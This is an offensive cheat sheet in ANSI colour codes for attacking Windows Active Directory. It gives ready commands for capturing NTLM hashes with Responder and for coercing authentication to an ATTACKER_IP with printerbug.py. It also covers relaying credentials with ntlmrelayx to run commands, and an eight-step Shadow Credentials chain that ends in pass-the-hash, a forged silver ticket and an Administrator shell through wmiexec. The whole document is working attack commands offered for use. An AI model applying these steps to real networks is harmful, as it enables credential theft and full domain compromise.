\033[0;34m##################################################################################\033[0m
\033[1;35m=== responder (Linux/Windows) ===\033[0m
\033[0;31m- listen on SMB Server & capture hash -\033[0m
\033[1;31mon linux:\033[0m
sudo responder -I <INTERFACE_TO_LISTEN>

\033[1;31mon windows:\033[0m
dir \\\\<ATTACKER_IP>\\<Random>

\033[0;31m- listen on SMB Server & capture hash via printerbug.py (SMB) -\033[0m
\033[1;31mon linux [1]:\033[0m
sudo responder -I <INTERFACE_TO_LISTEN>

\033[1;31mon linux [2]:\033[0m
python3 printerbug.py <domain_name>/<domain_user_name>:'<domain_user_pass>'@<TARGET_IP> <ATTACKER_IP>

\033[0;31m- listen on HTTP Server & capture hash via printerbug.py (WebDav) -\033[0m
\033[1;31mon linux [1]:\033[0m
sudo responder -I <INTERFACE_TO_LISTEN>

\033[1;31mon linux [2]:\033[0m
python3 printerbug.py <domain_name>/<domain_user>:'<domain_user_pass>'@<TARGET_IP> <NetBiosName>@80/<Random>

\033[0;34m##################################################################################\033[0m
\033[1;35m=== impacket-ntlmrelayx (Linux/Windows) ===\033[0m
\033[0;31m- relay command to specific IP/COMPUTER -\033[0m
\033[1;31mon linux:\033[0m
impacket-ntlmrelayx --no-http-server -smb2support -t <IP/COMPUTER> -c "<command>"

\033[1;31mon windows:\033[0m
dir \\\\<ATTACKER_IP>\\<SHARE>

\033[0;31m- Shadow Credentials Attack -\033[0m
\033[0;37m[1] -> Setup listener 
[2] -> Capture traffic 
[3] -> Create nopass version of generated.pfx file
[4] -> Generate ccache and retrieve NT hash for machine_account
[5] -> Authenticate with retrieved NT hash (will probably not be Administrator)
[6] -> Grab the DOMAIN SID
[7] -> With the NT hash & DOMAIN SID forge a silver ticket  
[8] -> Export KRB5CCNAME=<FILE.CCAHCE> & Authenticate (will most likely be Administrator)
\033[0m
\033[1;31mon linux [1]:\033[0m
impacket-ntlmrelayx -t ldap://<domain_controller> --shadow-credentials --shadow-target '<MACHINE_ACCOUNT$>' --no-validate-privs

\033[1;31mon linux [2]:\033[0m
python3 printerbug.py <domain_name>/<domain_user>:'<domain_user_pass>'@<TARGET_IP> <NetBiosName>@80/<Random>

\033[1;31mon linux [3]:\033[0m
certipy cert -pfx <generated.pfx> -password <generated_password> -export -out <nopass.pfx> 

\033[1;31mon linux [4]:\033[0m
certipy auth -pfx <nopass.pfx> -dc-ip <DC_IP> -username '<MACHINE_ACCOUNT$>' -domain '<domain_name>' 

\033[1;31mon linux [5]:\033[0m
crackmapexec smb <domain_name> -u '<MACHINE_ACCOUNT$>' -H '<NT_HASH>' 

\033[1;31mon linux [6]:\033[0m
impacket-lookupsid <domain_name>/<domain_user>@<DC_IP>

\033[1;31mon linux [7]:\033[0m
impacket-ticketer -nthash '<NT_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<domain_name>' -spn 'cifs/<NETBIOS.domain_name>' <JackSparrow>  

\033[1;31mon linux [8]:\033[0m
impacket-wmiexec -k -no-pass <JackSparrow>@<NETBIOS.domain_name>

\033[0;34m##################################################################################\033[0m
\n
